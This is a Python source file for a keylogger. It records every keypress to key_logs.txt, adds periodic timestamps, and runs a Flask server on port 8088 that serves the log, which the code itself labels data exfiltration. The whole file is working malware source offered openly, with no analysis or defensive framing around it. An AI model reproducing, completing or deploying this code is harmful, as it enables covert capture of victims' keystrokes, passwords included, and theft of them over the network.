#! Add import statements in a try-catch block
import keyboard
import time
import threading
from flask import Flask, send_file


'''
Add time to logs
[ time.asctime(time.gmtime()) ]
'''


class Keylogger:
    def __init__(self) -> None:
        self.log_file = 'key_logs.txt'
        keyboard.on_press(self.on_press)

        delayed_thread = threading.Thread(target=self.BreakTime)
        delayed_thread.start()

        server_thread = threading.Thread(target=self.exfil_data)
        server_thread.start()

        keyboard.wait()

    def on_press(self, event):
        with open(self.log_file, 'a') as logf:
            logf.write(f"{event.name}\t")

    def BreakTime(self):
        while True:
            print('[+]  Adding time log to file')
            with open(self.log_file, 'a') as logf:
                logf.write(f"\n[ {time.asctime(time.gmtime())} ]\n")
            time.sleep(10)  # 43200

    def exfil_data(self):
        '''
        Perform data exfiltration
        Open a port on the system 
        '''
        file = './key_logs.txt'
        app = Flask(__name__)

        @app.route('/')
        def serve_file():
            return send_file(file)
        app.run(port=8088)


Keylogger()
